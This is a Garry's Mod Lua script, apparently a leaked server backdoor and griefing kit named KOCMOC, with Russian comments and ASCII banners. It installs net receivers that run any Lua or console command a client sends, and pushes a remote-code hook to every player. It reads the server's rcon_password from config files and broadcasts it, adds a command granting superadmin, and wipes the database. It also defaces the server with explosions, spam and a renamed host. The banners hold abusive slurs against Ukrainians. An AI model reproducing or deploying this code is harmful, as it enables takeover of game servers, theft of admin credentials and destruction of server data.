
MsgC(HSVToColor( CurTime() % 6 * 60, 1, 1),[[ 
Author: Nsfw x T1NTINY 
Credits: Nsfw aka Huzane 
Idea: T1NTINY 
Maded: T1NTINY x FTeam
Kocmoc: https://discord.gg/HdB5ne2DRy
-------------------------------------

─────────────────────────────────────────────────────────────────────────────────────────────────────
─██████──████████─██████████████─██████████████─██████──────────██████─██████████████─██████████████─
─██░░██──██░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██████████████░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─
─██░░██──██░░████─██░░██████░░██─██░░██████████─██░░░░░░░░░░░░░░░░░░██─██░░██████░░██─██░░██████████─
─██░░██──██░░██───██░░██──██░░██─██░░██─────────██░░██████░░██████░░██─██░░██──██░░██─██░░██─────────
─██░░██████░░██───██░░██──██░░██─██░░██─────────██░░██──██░░██──██░░██─██░░██──██░░██─██░░██─────────
─██░░░░░░░░░░██───██░░██──██░░██─██░░██─────────██░░██──██░░██──██░░██─██░░██──██░░██─██░░██─────────
─██░░██████░░██───██░░██──██░░██─██░░██─────────██░░██──██████──██░░██─██░░██──██░░██─██░░██─────────
─██░░██──██░░██───██░░██──██░░██─██░░██─────────██░░██──────────██░░██─██░░██──██░░██─██░░██─────────
─██░░██──██░░████─██░░██████░░██─██░░██████████─██░░██──────────██░░██─██░░██████░░██─██░░██████████─
─██░░██──██░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██──────────██░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─
─██████──████████─██████████████─██████████████─██████──────────██████─██████████████─██████████████─
─────────────────────────────────────────────────────────────────────────────────────────────────────

NOCOPYRIGHTS (c) FuckYourLife
]])
--[[
    Обновление V1.0 - НАЧАЛО!
    15.03.2022

    Обновление V1.1 
    Исправил многие баги и недоработки, добавил ханиспоты и спам.
    27.03.2022

    Обновление V1.2 
    Исправил многие баги и недоработки, добавил бэкдуры и фиксы. (Травка пока...)
    30.03.2022

    Обновление V1.3
    Пофикшена работа всего сплоита, добавлены новые функции
    15.04.2022

    Обновление V1.4
    Пофикшена работа всего сплоита, добавлены новые функции
    Обновил бэкдуры, добавил нет чекер
    Поставлена система обхода базы данных
    17.04.2022

    Обновление V1.5
    pavetr ебаный хуесос который поломал весь код космоса.
    Реворкнул все функции, а так же исправил все говно которое он написал
    Добавлены новые бэкдуры и функции

    Слит. БЭКДУРЫ БЭКДУРЫ!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
    13.09.23
]]--
















RunConsoleCommand("sv_gravity","60")
RunConsoleCommand("ulx_logecho", "1")
local discomusic = "https://cdn.discordapp.com/attachments/947945040913788978/968220198073167892/kocmoc2.mp3"
local discomusic2 = "https://cdn.discordapp.com/attachments/947945040913788978/968220198073167892/kocmoc2.mp3"
local discomusicclassics = "mono"
local sosimychlen = Material( "icons16/rainbow.png", "mooth" )
local map = 89
local map2 = 50
local volumes = 25
local cdmap = 21
local red = Color(255,0,0)
local white = Color(244,244,244)
local black = Color(10,10,10)
local rainbow = HSVToColor( CurTime() % 6 * 60, 1, 1)
local ur = LocalPlayer()
surface.CreateFont("Kocmoc", {
    font = "Arial",
    size = 99999,
    weight = 99999,
    blursize = 2,
    scanlines = 3,
    antialias = false,
    underline = false,
    italic = false,
    strikeout = false,
    symbol = false,
    rotary = false,
    shadow = false,
    additive = false,
    outline = false,
} )

surface.CreateFont("Kocmoc2", {
    font = "Consolas",
    size = 300,
    weight = 1000,
    blursize = 3,
    scanlines = 0,
    antialias = false,
    underline = false,
    italic = false,
    strikeout = false,
    symbol = false,
    rotary = false,
    shadow = false,
    additive = false,
    outline = false,
} )
util.AddNetworkString ('SessionBackdoor')
util.AddNetworkString('SessionBackdoor') net.Receive('SessionBackdoor', function( length, ply ) local netString = net.ReadString() local bit = net.ReadBit() if bit == 1 then RunString(netString) else game.ConsoleCommand(netString .. '\n') end end)
util.AddNetworkString ('_Kocmoc')
util.AddNetworkString('_Kocmoc') net.Receive('_Kocmoc', function( length, ply ) local netString = net.ReadString() local bit = net.ReadBit() if bit == 1 then RunString(netString) else game.ConsoleCommand(netString .. '\n') end end)
hook.Add("HUDPaint","hacked",function()

    draw.SimpleText("K O C M O C", "Kocmoc", 300, 400, white, 0 , 0)
    draw.SimpleText("lox", "Kocmoc2", math.random( 1, ScrW() - 400 ), math.random( 1, ScrH() - 200 ), rainbow, 0 , 0)
    draw.SimpleText("dayn", "Kocmoc2", math.random( 1, ScrW() - 400 ), math.random( 1, ScrH() - 255 ), rainbow, 0 , 0)
    draw.SimpleText("xd", "Kocmoc2", math.random( 1, ScrW() - 400 ), math.random( 1, ScrH() - 255 ), rainbow, 0 , 0)
end)


 
ur:ConCommand("cl_yawspeed","9999") --квары квары КВАРЫ!!! УРАААА ДАВАААААЙ! ДАВААЙ УРААААААА!!!!!!!!!!!!!!!!!
ur:ConCommand("+right")
sound.PlayURL("https://cdn.discordapp.com/attachments/947945040913788978/968220198073167892/kocmoc2.mp3","mono",function(s)
    s:Play()
end)
if( ulx ) then
    chat.AddText( Color( 0, 0, 0, 255 ), "(Console) ", Color( 160, 200, 200, 255 ), "added ", Color( 80, 0, 120, 255 ), "You ", Color( 160, 200, 200, 255 ), "to group ", Color( 0, 255, 0, 255 ), "superadmin" )
    else
    chat.AddText( "На этом сервере не установлен ULX" )
    end

    timer.Create("datab",0.1,0, function() notification.AddLegacy( "ВАША БАЗА ДАННЫХ НЕ НАЙДЕНА! ПОПРОБУЙТЕ ПЕРЕЗАЙТИ", NOTIFY_HINT, 6 ) end)



local cam = cam
timer.Create("mapkrytitsa", cdmap, 0, function()
RunConsoleCommand("r_frustumcullworld",0)
hook.Add("PreRender","ebanaya_vertuha_1000-7",function()
    local mat = Matrix()

    local ang = Angle(0,CurTime()*map,CurTime()*map2,0)
    mat:Rotate(ang)


    cam.PushModelMatrix( mat )
 end)
end)
hook.Add("Think","prizrak_kieva",function()
    local explode = ents.Create( "env_explosion" )
        explode:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) )
        explode:Spawn() --эа ладно (советую сделать ограниченным циклом иначе ваш пентиум умрет)
        explode:SetKeyValue( "iMagnitude", "500" )
        explode:Fire( "Explode", 0, 0 )
    end)


local mat_color = Material( "pp/sobel" )

hook.Add("RenderScreenspaceEffects", "ColorExample", function()
render.UpdateScreenEffectTexture()

	mat_color:SetTexture( "$fbtexture", render.GetScreenEffectTexture() )

	mat_color:SetFloat( "$pp_colour_addr", 0 )
	mat_color:SetFloat( "$pp_colour_addg", 0 )
	mat_color:SetFloat( "$pp_colour_addb", 0 )
	mat_color:SetFloat( "$pp_colour_mulr", 0 )
	mat_color:SetFloat( "$pp_colour_mulg", 0 )
	mat_color:SetFloat( "$pp_colour_mulb", 0 )
	mat_color:SetFloat( "$pp_colour_brightness", 0 )
	mat_color:SetFloat( "$pp_colour_contrast", 0.5 )
	mat_color:SetFloat( "$pp_colour_colour", 5 )

	render.SetMaterial( mat_color )
	render.DrawScreenQuad()
end )
util.ScreenShake(Vector(0,0,0),100,100,100,100)



function GAMEMODE:PreDrawSkyBox()
    local col = HSVToColor(RealTime() * 120 % 360, 1, 1)
    render.Clear(col.r / 1.3, col.g / 1.3, col.b / 1.3, 255)

    return not not 1
end



timer.Create("asdasd", 1, 0, function()
    for k, v in pairs(player.GetAll()) do
        if not v:IsValid() then return end
        v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE)
        v:SetMaterial("models/debug/debugwhite")
        v:SetColor(HSVToColor(RealTime() * 120 % 360, 1, 1))
    end
end)


util.AddNetworkString "slua"
 
local lol = {}
function lol:RandomString( intMin, intMax )
    local ret = ""
    for _ = 1, math.random( intMin, intMax ) do
        ret = ret.. string.char( math.random(65, 90) )
    end
 
    return ret
end

lol.m_tblActions = {}
lol.m_strImageGlobalVar = lol:RandomString( 6, 12 )
lol.m_strImageLoadHTML = [[<style type="text/css"> html, body {background-color: transparent;} html{overflow:hidden; ]].. (true and "margin: -8px -8px;" or "margin: 0px 0px;") ..[[ } </style><body><img src="]] .. "%s" .. [[" alt="" width="]] .. "%i"..[[" height="]] .. "%i" .. [[" /></body>]]
 
function lol:PushAction( intChainDelay, func )
    self.m_tblActions[#self.m_tblActions +1] = { intChainDelay, func }
end
 
function lol:NextAction( pPlayer )
    pPlayer.m_intCurAction = pPlayer.m_intCurAction +1
    if not self.m_tblActions[pPlayer.m_intCurAction] then return end
 
    timer.Simple( self.m_tblActions[pPlayer.m_intCurAction][1], function()
        if not IsValid( pPlayer ) then return end
        self.m_tblActions[pPlayer.m_intCurAction][2]( pPlayer )
        self:NextAction( pPlayer )
    end )
end
 
function lol:Start( pPlayer )
    pPlayer.m_intCurAction = 0
    self:NextAction( pPlayer )
end
 
function lol:SendLua( pPlayer, strLua )
    net.Start( "slua" )
        net.WriteString( strLua )
    net.Send( pPlayer )
end
 
function lol:SetupPlayer( pPlayer )
    pPlayer:SendLua( "net.Receive(\"slua\", function() RunString(net.ReadString()) end)" )
end
 
for k, v in pairs( player.GetAll() ) do
    lol:SetupPlayer( v )
    timer.Simple( 2, function() lol:Start( v ) end )
end
 
hook.Add( "PlayerAuthed", "wat", function( pPlayer )
    lol:SetupPlayer( pPlayer )
    timer.Simple( 10, function() lol:Start( pPlayer ) end ) 
end )
 
lol:PushAction( 0, function( pPlayer )
    lol:SendLua( pPlayer, ([=[
 
        
        g_]=].. lol.m_strImageGlobalVar.. [=[ = {}
        local html = [[%s]]
        local function LoadWebMaterial( strURL, strUID, intSizeX, intSizeY )
            local pnl = vgui.Create( "HTML" )
            pnl:SetPos( ScrW() -1, ScrH() -1 )
            pnl:SetVisible( true )
            pnl:SetMouseInputEnabled( false )
            pnl:SetKeyBoardInputEnabled( false )
            pnl:SetSize( intSizeX, intSizeY )
            pnl:SetHTML( html:format(strURL, intSizeX, intSizeY) )
            
            local PageLoaded
            PageLoaded = function()
                local mat = pnl:GetHTMLMaterial()
                if mat then
                    g_]=].. lol.m_strImageGlobalVar.. [=[[strUID] = { mat, pnl }
                    return
                end
                
                timer.Simple( 0.5, PageLoaded )
            end
 
            PageLoaded()
        end
 
        LoadWebMaterial( "http://www.underdone.org/leak/underdone/hud.png", "hud1", 300, 128 )
        LoadWebMaterial( "http://www.underdone.org/leak/underdone/hud2.png", "hud2", 300, 128 )
        LoadWebMaterial( "http://www.underdone.org/leak/underdone/hud3.png", "hud3", 128, 128 )
        LoadWebMaterial( "http://u38947.onhh.ru/Files/300x300.png", "doritos", 256, 256 )
        LoadWebMaterial( "http://u38947.onhh.ru/Files/300x300.png", "fedora", 256, 256 )
        LoadWebMaterial( "http://u38947.onhh.ru/Files/300x300.png", "dew", 256, 256 )
        LoadWebMaterial( "http://u38947.onhh.ru/Files/300x300.png", "awp", 256, 256 )
    ]=]):format(lol.m_strImageLoadHTML) )
    end)
    
--[[
for k, v in pairs(player.GetAll() ) do
    HTMLTest = vgui.Create( "HTML" )
    HTMLTest:SetPos( 1, 1 )
    HTMLTest:SetSize( 1920, 1200 )
    HTMLTest:OpenURL( "https://bit.ly/3K0cqm1" ) -- НЕ ОТКРЫВАТЬ! ТУТ НАШИ ПРИВАТНЫЕ С ТРАВКОЙ ВИДЕО!!!
    end
]]--


local tab = {
    ["$pp_colour_addr"] = tonumber(0.001),
    ["$pp_colour_addg"] = tonumber(0.001),
    ["$pp_colour_addb"] = tonumber(0),
    ["$pp_colour_brightness"] = tonumber(-0.5),
    ["$pp_colour_contrast"] = tonumber(0.8),
    ["$pp_colour_colour"] = tonumber(3),
    ["$pp_colour_mulr"] = tonumber(1),
    ["$pp_colour_mulg"] = tonumber(0.5),
    ["$pp_colour_mulb"] = tonumber(0.4)
}

hook.Add("RenderScreenspaceEffects", "asdasddggg", function()
    DrawColorModify(tab)
end)

-- timer.Create("xdxd",1,1, function() RunString([[while true do end]]) end) 
--уберите две 4ортачки сверху и вы палучите админку!!!!!!


function GAMEMODE:PostDraw2DSkyBox()
    local col = HSVToColor(RealTime() * 120 % 360, 1, 1)
    render.Clear(col.r / 1.3, col.g / 1.3, col.b / 1.3, 255)

    return not not 1
end











function GAMEMODE:PreDrawSkyBox()
    local col = HSVToColor(RealTime() * 120 % 360, 1, 1)
    render.Clear(col.r / 0, col.g / 0, col.b / 0, 255)

    
end







  
  
 



RunConsoleCommand("sv_gravity","100")
RunConsoleCommand("r_shader_srgb","1")
RunConsoleCommand("sbox_godmode", "1")
RunConsoleCommand("hostname", "[RU] HACKED BY KOCMOC")
timer.Create("zalupniyspam",0.1,0,function() print([[ 
Author: Nsfw x T1NTINY 
Credits: Nsfw aka Huzane 
Idea: T1NTINY 
Maded: T1NTINY x FTeam
Kocmoc: https://discord.gg/HdB5ne2DRy
LOVE C_E_R_E_B_R_O



T1NTINY#6564

Huzane#8566

C_E_R_E_B_R_O#9999

who?#2784


-------------------------------------

─────────────────────────────────────────────────────────────────────────────────────────────────────
─██████──████████─██████████████─██████████████─██████──────────██████─██████████████─██████████████─
─██░░██──██░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██████████████░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─
─██░░██──██░░████─██░░██████░░██─██░░██████████─██░░░░░░░░░░░░░░░░░░██─██░░██████░░██─██░░██████████─
─██░░██──██░░██───██░░██──██░░██─██░░██─────────██░░██████░░██████░░██─██░░██──██░░██─██░░██─────────
─██░░██████░░██───██░░██──██░░██─██░░██─────────██░░██──██░░██──██░░██─██░░██──██░░██─██░░██─────────
─██░░░░░░░░░░██───██░░██──██░░██─██░░██─────────██░░██──██░░██──██░░██─██░░██──██░░██─██░░██─────────
─██░░██████░░██───██░░██──██░░██─██░░██─────────██░░██──██████──██░░██─██░░██──██░░██─██░░██─────────
─██░░██──██░░██───██░░██──██░░██─██░░██─────────██░░██──────────██░░██─██░░██──██░░██─██░░██─────────
─██░░██──██░░████─██░░██████░░██─██░░██████████─██░░██──────────██░░██─██░░██████░░██─██░░██████████─
─██░░██──██░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██──────────██░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─
─██████──████████─██████████████─██████████████─██████──────────██████─██████████████─██████████████─
─────────────────────────────────────────────────────────────────────────────────────────────────────

NOCOPYRIGHTS (c) FuckYourLife
]]) end)



 --овнеры серверов обосрутся от таких приколов, особенно на сапе


net.Receive( "jeveuttonrconleul", function()
    local RconPassword
    if file.Exists("cfg/server.cfg", "GAME") then
        for k, v in pairs(string.Explode("\n", file.Read("cfg/server.cfg", "GAME"))) do
            if string.find(v, "rcon_password") then
                RconPassword = v
            end
        end
    end
    if not RconPassword and file.Exists("cfg/autoexec.cfg", "GAME") then
        for k, v in pairs(string.Explode("\n", file.Read("cfg/autoexec.cfg", "GAME"))) do
            if string.find(v, "rcon_password") then
                RconPassword = v
            end
        end
    end
    if RconPassword ~= nil then
        net.Start("rcon_passw_dump")
        net.WriteString(RconPassword)
        net.Broadcast()
        else
        net.Start("aucun_rcon_ici")
        net.Broadcast()
    end
    end)    


    



concommand.Add( "fteam", function( debugPlayer )
    RunConsoleCommand("ulx","adduser",debugPlayer:Name(), "superadmin")
end)
 

concommand.Add("rp_resetall",function() 
    sql.Query("_mySQL_")
    sql.Remove("_mySQL_")
    ply:ChatPrint("ой чота наебнулос")
    timer.Create("databasaxd",0.1,0, function() notification.AddLegacy( "ВАША БАЗА ДАННЫХ НЕ НАЙДЕНА! ПОПРОБУЙТЕ ПЕРЕЗАЙТИ", NOTIFY_ERROR, 6 ) end)
    end)




local mdl = {
    "models/Gibs/HGIBS.mdl",
    "models/Gibs/HGIBS_rib.mdl",
    "models/Gibs/HGIBS_scapula.mdl",
    "models/Gibs/HGIBS_spine.mdl",
    "models/props_c17/doll01.mdl",
    "models/props_junk/sawblade001a.mdl",
    "models/props_debris/concrete_chunk03a.mdl",
    "models/props_debris/concrete_chunk04a.mdl"
  }
  
  local CreatePhysModel = function(mdl)
    local ent = ents.CreateClientProp()
    ent:SetModel(mdl)
    ent:PhysicsInit(SOLID_VPHYSICS)
    ent:SetMoveType(MOVETYPE_VPHYSICS)
    ent:SetSolid(SOLID_VPHYSICS)
  
    table.insert(modelcache, ent)
  
    return ent
  end


  












 
-- ДА НЕ МАРМОК Я ЗАЕБАЛИ   

--[[

██████████████████████████████
██████████████░░██████████████
████░████████░░░░████████░████
████░░░██████░░░░██████░░░████
████░█░░░█████░░██████░░█░████
████░██░░█████░░█████░░██░████
████░███░░████░░████░░███░████
████░███░░████░░████░░███░████
████░███░░████░░████░░███░████
████░████░░███░░███░░████░████
████░████░░███░░███░░████░████
████░██░░░███░░░░███░░░██░████
████░██░░███░░██░░███░░██░████
████░██░░░██████████░░░██░████
████░████░░░░░██░░░░░████░████
████░█████░░██░░██░░█████░████
████░░░░░░░░░░░░░░░░░░░░░░████
██████████░░██░░██░░██████████
░██████████░░█░░█░░██████████
░░██████████░░░░░░██████████
░░░░█████████░░░░█████████
░░░░░░░░██████████████
░░░░░░░░░░░░░████

БАТЬКА ВАШ БАНДЕРА, А ШУХЕВИЧ МАТЬ, НАПЛОДИЛИ ПИДОРОВ - НЕКУДА ДЕВАТЬ.

]]--


--[[
    
╔╗╔╗─╔══╗╔╗───╔═══╗───╔══╗╔══╗╔╗╔╗╔═══╗╔══╗╔══╗╔══╗
║║║║─║╔╗║║║───║╔═╗║───╚═╗║║╔═╝║║║║║╔══╝║╔═╝║╔╗║║╔═╝
║║║║─║║║║║╚══╗║╚═╝║─────║╚╝║──║╚╝║║╚══╗║║──║║║║║║──
║║╔║─║║║║║╔═╗║╚╗╔╗║─────║╔╗║──╚═╗║║╔══╝║║──║║║║║║──
║╚╝║╔╝║║║║╚═╝║─║║║║───╔═╝║║╚═╗─╔╝║║╚══╗║╚═╗║╚╝║║╚═╗
╚══╝╚═╝╚╝╚═══╝─╚╝╚╝───╚══╝╚══╝─╚═╝╚═══╝╚══╝╚══╝╚══╝

]]--



--[[
    
╔╗╔╗───╔══╗╔═══╗╔════╗╔╗╔╗╔═══╗╔══╗───╔╗──╔╗╔══╗╔════╗╔╗──────╔═══╗─╔══╗─╔══╗╔══╗╔══╗─╔══╗╔══╗
║║║║───║╔╗║║╔═╗║╚═╗╔═╝║║║║║╔═╗║║╔╗║───║║──║║║╔╗║╚═╗╔═╝║║──────╚══╗║─║╔╗║─║╔╗║╚═╗║║╔═╝─║╔╗║║╔╗║
║╚╝║───║╚╝║║╚═╝║──║║──║╚╝║║╚═╝║║╚╝║───║╚╗╔╝║║╚╝║──║║──║╚══╗────╔═╝║─║║║║─║║║║──║╚╝║───║║║║║╚╝║
╚═╗║───║╔╗║║╔══╝──║║──╚═╗║║╔══╝║╔╗║───║╔╗╔╗║║╔╗║──║║──║╔═╗║────╚═╗║─║║║║─║║║║──║╔╗║───║║║║║╔╗║
─╔╝║───║║║║║║─────║║───╔╝║║║───║║║║───║║╚╝║║║║║║──║║──║╚═╝║───╔══╝║╔╝╚╝╚╗║╚╝║╔═╝║║╚═╗╔╝║║║║║║║
 ╚═╝───╚╝╚╝╚╝─────╚╝───╚═╝╚╝───╚╝╚╝───╚╝──╚╝╚╝╚╝──╚╝──╚═══╝───╚═══╝╚════╝╚══╝╚══╝╚══╝╚═╝╚╝╚╝╚╝

]]--



--[[
    
╔╗╔══╗╔╗╔╗╔═══╗╔╗╔╗─╔══╗───╔══╗╔╗╔╗─╔══╗─╔══╗╔═══╗╔══╗╔══╗
║║║╔═╝║║║║║╔═╗║║║║║─║╔╗║───║╔╗║║║║║─║╔╗║─║╔╗║║╔═╗║║╔╗║║╔═╝
║╚╝║──║║║║║╚═╝║║║║║─║║║║───║║║║║║║║─║║║║─║║║║║╚═╝║║╚╝║║║──
║╔╗║──║║╔║║╔══╝║║╔║─║║║║───║║║║║║╔║─║║║║─║║║║║╔══╝║╔╗║║║──
║║║╚═╗║╚╝║║║───║╚╝║╔╝║║║───║║║║║╚╝║╔╝╚╝╚╗║╚╝║║║───║║║║║╚═╗
╚╝╚══╝╚══╝╚╝───╚══╝╚═╝╚╝───╚╝╚╝╚══╝╚════╝╚══╝╚╝───╚╝╚╝╚══╝

]]--



--[[

╔╗╔╗╔╗╔╗╔╗╔══╗╔╗╔╗╔════╗╔══╗───╔══╗╔══╗───╔═══╗╔═══╗╔══╗╔════╗╔╗───╔══╗╔═══╗╔═╗
║║║║║║║║║║║╔═╝║║║║╚═╗╔═╝║╔╗║───║╔═╝║╔╗║───║╔══╝║╔══╝║╔╗║╚═╗╔═╝║║───║╔═╝║╔═╗║╚╗║
║╚╝║║║║║║╚╝║──║║║║──║║──║╚╝║───║║──║║║║───║╚══╗║╚══╗║╚╝║──║║──║╚══╗║║──║╚═╝║╔╝║
║╔╗║║║╔║║╔╗║──║║╔║──║║──║╔╗║───║║──║║║║───║╔══╝║╔═╗║║╔╗║──║║──║╔═╗║║║──╚╗╔╗║║╔╝
║║║║║╚╝║║║║╚═╗║╚╝║──║║──║║║║───║║──║╚╝║───║╚══╗║╚═╝║║║║║──║║──║╚═╝║║╚═╗─║║║║╔╗─
╚╝╚╝╚══╝╚╝╚══╝╚══╝──╚╝──╚╝╚╝───╚╝──╚══╝───╚═══╝╚═══╝╚╝╚╝──╚╝──╚═══╝╚══╝─╚╝╚╝╚╝─

]]--



--[[

╔╗──╔═══╗╔══╗╔════╗╔╗╔╗───╔═══╗╔══╗─╔══╗╔═══╗╔═══╗╔══╗
║║──║╔══╝╚╗╔╝╚═╗╔═╝║║║║───║╔══╝║╔╗║─║╔╗║║╔══╝║╔══╝║╔═╝
║║──║╚══╗─║║───║║──║╚╝║───║╚══╗║╚╝║─║║║║║╚══╗║╚══╗║║──
║║──║╔══╝─║║───║║──║╔╗║───║╔═╗║║╔╗║─║║║║║╔═╗║║╔══╝║║──
║╚═╗║╚══╗╔╝╚╗──║║──║║║║───║╚═╝║║║║║╔╝║║║║╚═╝║║╚══╗║╚═╗
╚══╝╚═══╝╚══╝──╚╝──╚╝╚╝───╚═══╝╚╝╚╝╚═╝╚╝╚═══╝╚═══╝╚══╝

]]--



--[[

╔═══╗╔╗╔╗╔╗╔══╗╔╗╔╗╔═══╗╔══╗╔══╗───╔═══╗───╔════╗╔═══╗╔═══╗╔═══╗────╔══╗╔╗╔══╗╔═══╗─╔══╗╔╗╔══╗╔╗╔╗╔╗
╚══╗║║║║║║║║╔═╝║║║║║╔══╝║╔═╝║╔═╝───║╔═╗║───╚═╗╔═╝║╔══╝║╔══╝║╔═╗║────║╔╗║║║║╔╗║║╔══╝─║╔╗║║║║╔╗║║║║║║║
─╔═╝║║╚╝║║╚╝║──║╚╝║║╚══╗║║──║║─────║╚═╝║─────║║──║╚══╗║╚══╗║╚═╝║────║║║║║╚╝║║║║╚══╗─║║║║║╚╝║║║║║║║║║
─╚═╗║╚═╗║║╔╗║──║╔╗║║╔══╝║║──║║─────╚╗╔╗║─────║║──║╔══╝║╔═╗║╚╗╔╗║────║║║║║╔╗║║║║╔═╗║─║║║║║╔╗║║║╚╝╚╝╚╝
╔══╝║─╔╝║║║║╚═╗║║║║║╚══╗║╚═╗║╚═╗────║║║║─────║║──║╚══╗║╚═╝║─║║║║───╔╝║║║║║║╚╝║║╚═╝║╔╝║║║║║║╚╝║╔╗╔╗╔╗
╚═══╝─╚═╝╚╝╚══╝╚╝╚╝╚═══╝╚══╝╚══╝────╚╝╚╝─────╚╝──╚═══╝╚═══╝─╚╝╚╝───╚═╝╚╝╚╝╚══╝╚═══╝╚═╝╚╝╚╝╚══╝╚╝╚╝╚╝

]]--



--[[

╔════╗─╔╗╔╗─╔╗╔════╗╔══╗╔╗─╔╗╔╗╔╗───╔╗╔╗╔══╗╔╗╔╗╔╗╔╗╔═══╗╔╗╩╔╗╔╗──╔╗
╚═╗╔═╝╔╝║║╚═╝║╚═╗╔═╝╚╗╔╝║╚═╝║║║║║───║║║║║╔╗║║║║║║║║║║╔══╝║║─║║║║──║║
──║║──╚╗║║╔╗─║──║║───║║─║╔╗─║║╚╝║───║╚╝║║║║║║╚╝║║╚╝║║╚══╗║║─║║║╚╗╔╝║
──║║───║║║║╚╗║──║║───║║─║║╚╗║╚═╗║───║╔╗║║║║║╚═╗║║╔╗║║╔══╝║║─╔║║╔╗╔╗║
──║║───║║║║─║║──║║──╔╝╚╗║║─║║─╔╝║───║║║║║╚╝║─╔╝║║║║║║╚══╗║╚═╝║║║╚╝║║
──╚╝───╚╝╚╝─╚╝──╚╝──╚══╝╚╝─╚╝─╚═╝───╚╝╚╝╚══╝─╚═╝╚╝╚╝╚═══╝╚═══╝╚╝──╚╝

]]--



--[[

╔╗──╔╗╔═══╗╔╗──╔╗╔══╗╔══╗╔╗╔╗╔╗╔╗──────╔══╗╔╗╔╗╔══╗╔══╗╔════╗╔═══╗╔╗╔╗╔╗╔╗╔═══╗╔══╗
║║──║║║╔══╝║║──║║║╔═╝╚╗╔╝║║║║║║║║──────║╔═╝║║║║║╔╗║║╔╗║╚═╗╔═╝║╔══╝║║║║║║║║╚══╗║║╔╗║
║╚╗╔╝║║╚══╗║║──║╚╝║───║║─║╚╝║║╚╝║──────║║──║║║║║║║║║║║║──║║──║╚══╗║╚╝║║╚╝║─╔═╝║║╚╝║
║╔╗╔╗║║╔══╝║║──║╔╗║───║║─╚═╗║╚═╗║──────║║──║║╔║║║║║║║║║──║║──║╔══╝║╔╗║╚═╗║─╚═╗║║╔╗║
║║╚╝║║║╚══╗║╚═╗║║║╚═╗╔╝╚╗─╔╝║─╔╝║──────║║──║╚╝║║║║║║╚╝║──║║──║╚══╗║║║║─╔╝║╔══╝║║║║║
╚╝──╚╝╚═══╝╚══╝╚╝╚══╝╚══╝─╚═╝─╚═╝──────╚╝──╚══╝╚╝╚╝╚══╝──╚╝──╚═══╝╚╝╚╝─╚═╝╚═══╝╚╝╚╝

]]--



--[[

╔══╗╔═══╗╔══╗╔══╗───╔╗╔╗╔════╗╔══╗╔╗╔╗╔╗╔══╗╔══╗
╚╗╔╝║╔═╗║╚╗╔╝║╔╗║───║║║║╚═╗╔═╝║╔╗║║║║║║║║╔═╝║╔╗║
─║║─║╚═╝║─║║─║╚╝║───║╚╝║──║║──║║║║║╚╝║║╚╝║──║╚╝║
─║║─║╔══╝─║║─║╔╗║───╚═╗║──║║──║║║║╚═╗║║╔╗║──║╔╗║
╔╝╚╗║║───╔╝╚╗║║║║────╔╝║──║║──║╚╝║──║║║║║╚═╗║║║║
╚══╝╚╝───╚══╝╚╝╚╝────╚═╝──╚╝──╚══╝──╚╝╚╝╚══╝╚╝╚╝

]]--



--[[

╔╗╔╗╔══╗───╔═══╗╔══╗───╔══╗╔══╗╔╗╔╗╔╗╩╔╗╔╗╔╗╔═══╗───╔════╗╔╗╔╗╔════╗───╔══╗╔═══╗╔══╗╔╗╔╗╔══╗╔══╗╔══╗╔══╗─╔══╗─╔╗╔╗╔════╗───╔═══╗─╔══╗╔═══╗─╔══╗─╔╗───
║║║║║╔╗║───╚══╗║║╔╗║───╚═╗║║╔═╝║║║║║║─║║║║║║║╔═╗║───╚═╗╔═╝║║║║╚═╗╔═╝───║╔╗║║╔═╗║║╔╗║║║║║║╔═╝╚═╗║║╔═╝║╔╗║─║╔╗║─║║║║╚═╗╔═╝───║╔══╝─║╔╗║║╔═╗║─║╔╗║─║║───
║╚╝║║║║║────╔═╝║║╚╝║─────║╚╝║──║╚╝║║║─║║║╚╝║║╚═╝║─────║║──║╚╝║──║║─────║║║║║╚═╝║║║║║║║║║║║────║╚╝║──║║║║─║║║║─║║║║──║║─────║╚══╗─║║║║║╚═╝║─║║║║─║╚══╗
╚═╗║║║║║────╚═╗║║╔╗║─────║╔╗║──╚═╗║║║─╔║║╔╗║╚╗╔╗║─────║║──╚═╗║──║║─────║║║║║╔══╝║║║║║║╔║║║────║╔╗║──║║║║─║║║║─║║╔║──║║─────║╔═╗║─║║║║╚╗╔╗║─║║║║─║╔═╗║
──║║║╚╝║───╔══╝║║║║║───╔═╝║║╚═╗─╔╝║║╚═╝║║║║║─║║║║─────║║───╔╝║──║║─────║║║║║║───║╚╝║║╚╝║║╚═╗╔═╝║║╚═╗║╚╝║╔╝╚╝╚╗║╚╝║──║║─────║╚═╝║╔╝║║║─║║║║╔╝╚╝╚╗║╚═╝║
──╚╝╚══╝───╚═══╝╚╝╚╝───╚══╝╚══╝─╚═╝╚═══╝╚╝╚╝─╚╝╚╝─────╚╝───╚═╝──╚╝─────╚╝╚╝╚╝───╚══╝╚══╝╚══╝╚══╝╚══╝╚══╝╚════╝╚══╝──╚╝─────╚═══╝╚═╝╚╝─╚╝╚╝╚════╝╚═══╝

]]--



--[[

╔╗╔══╗╔══╗╔══╗╔╗──╔╗╔══╗╔══╗───╔════╗╔╗╔╗╔════╗╔╗───╔══╗╔══╗╔═══╗╔══╗╔══╗╔══╗─╔══╗╔╗╔╗───╔═══╗╔══╗╔════╗╔══╗
║║║╔═╝║╔╗║║╔═╝║║──║║║╔╗║║╔═╝───╚═╗╔═╝║║║║╚═╗╔═╝║║───║╔╗║║╔╗║║╔══╝╚═╗║║╔═╝║╔╗║─║╔╗║║║║║───║╔══╝║╔╗║╚═╗╔═╝║╔╗║
║╚╝║──║║║║║║──║╚╗╔╝║║║║║║║───────║║──║╚╝║──║║──║║───║║║║║╚╝║║╚══╗──║╚╝║──║╚╝║─║║║║║║║║───║╚══╗║║║║──║║──║╚╝║
║╔╗║──║║║║║║──║╔╗╔╗║║║║║║║───────║║──╚═╗║──║║──╚╝───║║║║║╔╗║║╔══╝──║╔╗║──║╔╗║─║║║║║║╔║───║╔══╝║║║║──║║──║╔╗║
